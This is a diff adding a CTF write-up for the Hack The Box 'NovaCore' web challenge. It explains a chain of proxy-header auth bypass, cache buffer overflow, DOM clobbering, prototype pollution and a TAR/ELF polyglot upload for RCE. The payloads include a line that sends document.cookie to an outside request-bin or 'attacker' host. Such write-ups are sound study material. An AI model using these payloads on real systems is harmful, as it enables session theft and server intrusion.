@@ -1,0 +1,262 @@
+---
+title: Novacore
+description: ''
+tags:
+  - writeup
+  - xss
+  - sqli
+  - rce
+  - csp
+  - file-upload
+  - command-injection
+  - path-traversal
+  - prototype-pollution
+  - auth-bypass
+category: web
+draft: false
+ctf_event: HTB
+date: 2025-09-12
+---
+
+https://github.com/hackthebox/business-ctf-2025/tree/master/web/novacore
+
+# What your exploit does (line-by-line intuition)
+
+## Stage 1 — Auth bypass → cache overflow → XSS → cookie exfil
+
+**Headers trick**
+
+```python
+headers = {"Connection": "close, X-Real-IP"}
+
+```
+
+- Traefik would normally inject `X-Real-IP`, which **enables** the token check.
+- By adding `Connection: close, X-Real-IP`, you tell the proxy that the hop-by-hop header named `X-Real-IP` must be removed before forwarding. Flask then receives the request **without** `X-Real-IP`, and `@token_required` **skips** auth.
+
+**Create two trades owned by `sys_admin`**
+
+```python
+signals = get_active_signals()
+first_trade_id = copy_signal_trade(signal_id)
+copy_signal_trade(signal_id)  # second one
+
+```
+
+- `/api/copy_signal_trade` with no token now works.
+- The cache stores keys like `user:sys_admin:trade:<uuid>`.
+
+**Overflow arithmetic**
+
+```python
+OVERFLOW_OFFSET = 24
+
+```
+
+- Cached `value` is formatted as:
+
+  ```
+  "symbol|{symbol}|action|{action}|price|{price}"
+
+  ```
+
+- With `symbol="1"` and `action="2"`, the fixed preamble before `price` is
+  `len("symbol|1|action|2|price|") = 24`.
+  You subtract this so your `price` bytes line up on 256-byte boundaries.
+
+**1st overflow: write HTML into the _next_ entry’s value**
+
+```python
+dom_clobbering = "<embed/name=getElementById></embed>" \
+                 "<div/id=\"UI_DEV_MODE\"></div>" \
+                 "<a/int=\"1/../../view/1\"/id=\"LOG_LEVEL\"></a>"
+
+malicious_payload_1 = "a"* (256*2 - 24) + \
+                      f"symbol|a|action|a|price|a{dom_clobbering}"
+
+edit_trade(..., price=malicious_payload_1)
+
+```
+
+- The cache uses `strcpy` into fixed `char value[256]`. No bounds checking.
+- Layout per entry: `[key(256)] [value(256)]`.
+- Writing `(256*2 - 24)` bytes from `value` of entry `E`:
+  - fills `E.value` (remaining `256-24`),
+  - fills **all** of `E+1.key` (256),
+  - the next bytes start at **`E+1.value`**, where you now place a **well-formed trade string** ending with your **HTML payload**.
+- The HTML uses **DOM clobbering** to:
+  - break `document.getElementById` → jump into `catch` in `dashboard.js`,
+  - define `window.UI_DEV_MODE` via `<div id=UI_DEV_MODE>` → take the “dev” path,
+  - set `<a id=LOG_LEVEL int="1/../../view/1">` → the app fetches `/front_end_error/view/1`.
+
+**2nd overflow: change the _next_ entry’s key to admin’s**
+
+```python
+malicious_payload_2 = "a"* (256 - 24) + f"user:1:trade:{uuid.uuid4()}"
+edit_trade(..., price=malicious_payload_2)
+
+```
+
+- Now you land **exactly** at the start of `E+1.key` and overwrite it with
+  `user:1:trade:<uuid>`. Admin (id=1) now **owns** the row you polluted.
+
+**Seed prototype pollution the front-end will pull**
+
+```python
+prototype_pollution = {"__proto__":{"length":
+  "location='https://k31x5f3u.requestrepo.com/?'+document.cookie;//"}}
+report_error(..., prototype_pollution)
+
+```
+
+- When the bot hits `/my_trades`, your DOM clobbering forces a request to
+  `/front_end_error/view/1`, which returns your JSON.
+- The page `merge()`s that JSON into a live object **without guards** →
+  **prototype pollution**: `logData.config.length` becomes attacker-controlled.
+- Then the code does:
+  ```jsx
+  eval(`${configKeysLength} > 5 ? 'Large' : 'Small'`);
+  ```
+  With CSP allowing `'unsafe-eval'`, your string executes. You set `location=...`
+  to **navigate** (top-level navigation is not blocked by CSP) and leak `document.cookie`
+  to your request bin. That gives you the **Flask session** cookie for admin.
+
+## Stage 2 — Privileged upload → TAR/ELF polyglot → RCE → flag
+
+**Use admin session**
+
+```python
+session_cookie = "<stolen flask session>"
+session.cookies.set_cookie(name="session", value=session_cookie)
+
+```
+
+**Build ELF that can also look like a TAR**
+
+- `SHELLCODE_ASM`: tiny `_start` that `execve(BIN, ARG)` then exits.
+- Custom **linker script** places a big `.custom` segment **before** `.text`
+  so there’s space to stash TAR blocks without breaking ELF.
+- Create a **TAR** where the first path is named `\x7FELF/...` (helps with magic alignment games), then:
+  - copy the **ELF** to `new_tar`,
+  - `dd` TAR bytes into `new_tar` (overlay TAR blocks inside the reserved segment),
+  - recompute/patch the **TAR checksum** field so `exiftool` says “File Type : TAR”.
+
+**Upload into plugins via traversal**
+
+```python
+files = {"dataset_file": ("../plugins/demo.tar", open(file, "rb"))}
+POST /upload_dataset
+
+```
+
+- Filename regex allows `.` and `/` → `../plugins/...` **traverses** into plugins.
+- Server validates content with:
+  - `exiftool` (detect TAR),
+  - `readelf -h` (detect ELF).
+- Your **polyglot** passes both.
+
+**Execute and harvest**
+
+```python
+POST /run_plugin  plugin=demo.tar  → stdout in page
+
+```
+
+- 1st run `BIN=/bin/ls ARG=/` → the output leaks the randomized flag filename (`/flag<hex>.txt`).
+- Rebuild polyglot with `BIN=/bin/cat ARG=/flagXYZ.txt`, upload, run, parse `HTB{...}`.
+
+---
+
+# CTF Write-up (concise)
+
+## Challenge
+
+NovaCore (Web). Goal: read `/flag*.txt`. Stack: Traefik → Flask 3, SQLite, custom TCP cache, admin bot (Selenium). CSP: `default-src 'self'; script-src 'self' 'nonce-...' 'unsafe-eval'`.
+
+## Key vulns
+
+1. **Auth bypass via proxy header confusion**
+
+   `@token_required` enforces token only if `X-Real-IP` is present. Using
+
+   `Connection: close, X-Real-IP` makes the proxy strip `X-Real-IP` before forwarding → backend sees no header → **no auth**.
+
+2. **Heap-like overflow across cache entries**
+
+   Custom cache (`aetherCache.c`) stores `Entry { char key[256]; char value[256]; }` arrays and writes with `strcpy` (no bounds checks). Over-long `value` overflows into next `key` and `value`.
+
+3. **Stored HTML injection → DOM clobbering**
+
+   `/my_trades` renders `action|price|symbol` with `|safe`. We inject HTML **without spaces** (cache parses with `sscanf("%s %s")`) using tags like `<embed name=...>` and `<div id=...>` to clobber globals and throw into a `catch` path.
+
+4. **Prototype pollution → `unsafe-eval` RCE in the browser**
+
+   In `dashboard.js`, on error it does:
+   - `fetch('/front_end_error/view/<level>')` → `JSON.parse` → `merge(...)` (no guards) → **pollute `__proto__.length`**,
+   - then `eval(`$&#123;configKeysLength&#125; > 5 ? ...`)` → **runs attacker JS**.
+     CSP allows `'unsafe-eval'`, so code executes. We set `location=...` to exfil the admin cookie.
+
+5. **Upload traversal + content confusion → server RCE**
+
+   `/upload_dataset` saves as `join("/app/application/datasets", filename)` with a permissive filename regex → `../plugins/…` **traversal** into the plugins dir.
+
+   Content is accepted if `exiftool` says **TAR** and `readelf -h` says **ELF**. A crafted **TAR/ELF polyglot** passes both; `/run_plugin` then executes it.
+
+## Exploit chain
+
+1. **Bypass API auth** with `Connection: close, X-Real-IP` and call:
+   - `/api/active_signals`
+   - `/api/copy_signal_trade` twice (create two `sys_admin` trades).
+2. **Overflow cache** via `/api/edit_trade`:
+   - Overflow `E.value` → `E+1.key` → write HTML into `E+1.value`.
+   - Second overflow to set `E+1.key = user:1:trade:<uuid>`.
+3. **Seed prototype pollution**:
+   - `POST /front_end_error/new/1` with `{"__proto__":{"length":"location='https://…?'+document.cookie;//"}}`.
+4. **Admin bot visits `/my_trades`**:
+   - Your **DOM clobber** forces the error path, fetches `/front_end_error/view/1`, merges JSON, **eval** runs and navigates to your server with the cookie.
+5. **Use admin cookie** to:
+   - Upload **polyglot** as `../plugins/demo.tar`,
+   - Run it to list `/` and learn the randomized flag filename,
+   - Re-upload polyglot that `cat`s the flag,
+   - `/run_plugin` shows `HTB{...}`.
+
+## Root causes
+
+- Trusting reverse-proxy headers without strict handling.
+- C code `strcpy` into fixed buffers, no bounds checks.
+- Rendering untrusted content with Jinja `|safe`.
+- Prototype pollution via recursive merge; **`unsafe-eval`** in CSP.
+- Path traversal in upload + dual-format content validation.
+
+## Snippets (from your PoC)
+
+**Overflow math** (why 24)
+
+```
+"symbol|1|action|2|price|" → 24 bytes before `price`
+
+```
+
+- Fill: `(256*2 - 24)` → land at `[E+1].value` to drop HTML.
+- Fill: `(256 - 24)` → land at `[E+1].key` to rewrite owner to `user:1:trade:<uuid>`.
+
+**DOM-clobber payload (no spaces)**
+
+```html
+<embed/name=getElementById></embed>
+<div/id="UI_DEV_MODE"></div>
+<a/int="1/../../view/1"/id="LOG_LEVEL"></a>
+
+```
+
+**Prototype pollution**
+
+```json
+{ "__proto__": { "length": "location='https://attacker/?'+document.cookie;//" } }
+```
+
+**Polyglot idea**
+
+- ELF with `.custom` large RW segment to hold TAR blocks.
+- Overlay TAR bytes (`dd`) into the reserved range and fix TAR checksum.
+- Filename `../plugins/demo.tar` → lands in plugins; `/run_plugin` executes.
